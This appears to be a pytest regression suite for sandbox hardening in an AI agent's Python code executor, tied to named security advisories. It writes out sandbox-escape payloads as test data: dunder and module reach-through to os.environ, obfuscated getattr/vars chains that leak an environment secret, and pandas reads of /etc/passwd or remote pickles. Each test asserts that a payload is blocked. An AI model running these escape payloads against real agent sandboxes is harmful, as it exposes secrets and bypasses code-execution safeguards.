"""Regression tests for Change 2 — sandbox hardening.

GHSA-4rj2-cgv9-3jf9 (9.0) and GHSA-w5rx-6q29-f273 (10.0, hardening half).

Each fails against the unfixed tree:
  * skills used to force is_relaxed_execution() True (validators no-op);
  * the CodeAgent path ran only validate_dangerous_modules (dunder allowed);
  * run_local executed arbitrary code with no gate.
"""

import asyncio

import pytest

from cuga.backend.cuga_graph.nodes.cuga_lite.executors.common.benchmark_mode import (
    is_relaxed_execution,
)
from cuga.backend.cuga_graph.nodes.cuga_lite.executors.common import benchmark_mode
from cuga.backend.cuga_graph.nodes.cuga_lite.executors.common.security import SecurityValidator
from cuga.backend.tools_env.code_sandbox import sandbox
from cuga.config import settings

C2 = "g = json.dumps.__globals__\nosmod = g['__builtins__']['__import__']('os')\nprint(osmod.environ)\n"

# AGENTS.md: every test in this module is a fast, isolated unit test.
pytestmark = pytest.mark.unit


@pytest.mark.parametrize("profile", ["appworld", "bpo"])
def test_benchmark_profile_does_not_relax_execution(monkeypatch, profile):
    monkeypatch.setattr(settings.advanced_features, "benchmark", profile)
    assert is_relaxed_execution() is False
    with pytest.raises(ImportError):
        SecurityValidator.validate_imports("import os\n")
    with pytest.raises(PermissionError):
        SecurityValidator.validate_wrapped_code(C2)


def test_code_security_enforced_by_default():
    assert settings.execution.enforce_code_security is True
    assert is_relaxed_execution() is False


def test_explicit_enforce_off_relaxes_and_warns(monkeypatch):
    monkeypatch.setattr(settings.execution, "enforce_code_security", False)
    monkeypatch.setattr(benchmark_mode, "_warned_relaxed", False)
    messages = []
    handler_id = benchmark_mode.logger.add(messages.append, level="WARNING")
    try:
        benchmark_mode.warn_if_relaxed()
    finally:
        benchmark_mode.logger.remove(handler_id)
    assert is_relaxed_execution() is True
    SecurityValidator.validate_imports("import os\n")
    assert any("execution.enforce_code_security is false" in str(m) for m in messages)


def test_skills_does_not_relax_execution():
    # Skills has no lever over the code-security checks any more (GHSA-4rj2): the only
    # relaxation is execution.enforce_code_security=false; it is true by default.
    assert is_relaxed_execution() is False
    with pytest.raises(ImportError):
        SecurityValidator.validate_imports("import os\n")


def test_codeagent_path_rejects_dunder_traversal():
    # The strict validator now also guards the CodeAgent path.
    with pytest.raises(PermissionError):
        SecurityValidator.validate_wrapped_code(C2)


def test_run_local_gated_off_by_default(monkeypatch):
    monkeypatch.delenv("CUGA_ALLOW_UNRESTRICTED_RUN_LOCAL", raising=False)
    with pytest.raises(RuntimeError):
        asyncio.run(sandbox.run_local("print(1)"))


def test_calendar_is_allowed_under_strict_validation():
    # CUGA runs date-oriented model code that imports the stdlib `calendar` module;
    # enforcing the sandbox must not break it (os/sys/subprocess stay blocked).
    SecurityValidator.validate_imports("import calendar\nprint(calendar.monthrange(2026, 8))\n")
    with pytest.raises(ImportError):
        SecurityValidator.validate_imports("import os\n")


# --- F1: allowlisted-module reach-through (GHSA-4rj2 review #1 / GHSA-w5rx C-2 /
#     GHSA-2xq5-x376-qqh2). An allowed module returns the real object, so an attribute
#     chain can reach a forbidden module or a data-library I/O method. The strict
#     validator used to inspect only the root name; it now checks every link. ---


@pytest.mark.parametrize(
    "payload",
    [
        "import typing\nprint(typing.sys.modules['os'].environ)\n",
        "import asyncio\nprint(asyncio.sys.modules['os'].environ)\n",
        "import calendar\nprint(calendar.sys.modules)\n",
    ],
)
def test_module_reach_through_is_blocked(payload):
    with pytest.raises(PermissionError):
        SecurityValidator.validate_wrapped_code(payload)


@pytest.mark.parametrize(
    "payload",
    [
        "import pandas\npandas.read_pickle('http://x/y.pkl')\n",
        "import pandas\npandas.read_csv('/etc/passwd')\n",
        "import pandas\npandas.DataFrame({'a': [1]}).to_csv('/tmp/x.csv')\n",
        "import numpy\nnumpy.load('x.npy', allow_pickle=True)\n",
    ],
)
def test_data_library_io_is_blocked(payload):
    with pytest.raises(PermissionError):
        SecurityValidator.validate_wrapped_code(payload)


def test_in_memory_pandas_still_allowed():
    # The fix blocks file/URL/pickle I/O, not in-memory dataframe work.
    SecurityValidator.validate_wrapped_code(
        "import pandas\ndf = pandas.DataFrame({'a': [1, 2]})\nprint(df['a'].sum())\n"
    )


# --- Dynamic-attribute reach-through (GHSA-4rj2 review gap). The AST visitor only
#     sees attribute *names* in the source, so a chain built through getattr/vars or a
#     runtime string reaches forbidden state with no forbidden name to catch. Closed on
#     two fronts: getattr/hasattr/setattr/delattr/vars are no longer in the safe builtins,
#     and 'modules'/'environ' are forbidden attributes. ---


@pytest.mark.parametrize("name", ["getattr", "hasattr", "setattr", "delattr", "vars"])
def test_attribute_accessor_builtins_not_exposed(name):
    from cuga.backend.cuga_graph.nodes.cuga_lite.executors.common.restricted_environment import (
        RestrictedEnvironment,
    )

    restricted_import = RestrictedEnvironment.create_restricted_import(set())
    safe_builtins = RestrictedEnvironment.create_safe_builtins(restricted_import)
    assert name not in safe_builtins
    # locals() stays — the code wrapper returns locals() to capture new variables.
    assert "locals" in safe_builtins


@pytest.mark.parametrize(
    "payload",
    [
        "import typing\nprint(typing.sys.modules['os'].environ['HOME'])\n",
        "import typing\ng = getattr\nprint(g(typing, 'sys').modules['os'].environ['HOME'])\n",
        "import typing\nprint(vars(typing)['sys'].modules['os'].environ['HOME'])\n",
    ],
)
def test_module_dict_and_environ_reach_through_is_blocked(payload):
    with pytest.raises(PermissionError):
        SecurityValidator.validate_wrapped_code(payload)


def test_dynamic_accessor_leak_fails_end_to_end(monkeypatch):
    """Both documented key-leak routes must not return a process-env secret.

    Each is stopped either by the forbidden 'environ'/'modules' attribute or by the
    accessor builtin being absent (NameError) — never by leaking the value.
    """
    import os

    from cuga.backend.cuga_graph.nodes.cuga_lite.executors import CodeExecutor
    from cuga.backend.cuga_graph.state.agent_state import AgentState

    monkeypatch.setenv("CUGA_HARDENING_PROBE_SECRET", "do-not-leak")
    routes = [
        "import typing\ng = getattr\ns = g(typing, 'sy' + 's')\n"
        "m = g(s, 'modu' + 'les')['o' + 's']\nprint(x, g(m, 'envi' + 'ron')['CUGA_HARDENING_PROBE_SECRET'])\n",
        "import typing\ns = vars(typing)['sy' + 's']\n"
        "print(x, vars(vars(s)['modu' + 'les']['o' + 's'])['envi' + 'ron']['CUGA_HARDENING_PROBE_SECRET'])\n",
    ]
    assert os.environ["CUGA_HARDENING_PROBE_SECRET"] == "do-not-leak"
    for code in routes:
        state = AgentState(input="t", url="")
        result, _ = asyncio.run(
            CodeExecutor.eval_with_tools_async(code=code, _locals={"x": 1}, state=state, mode="local")
        )
        assert "do-not-leak" not in result
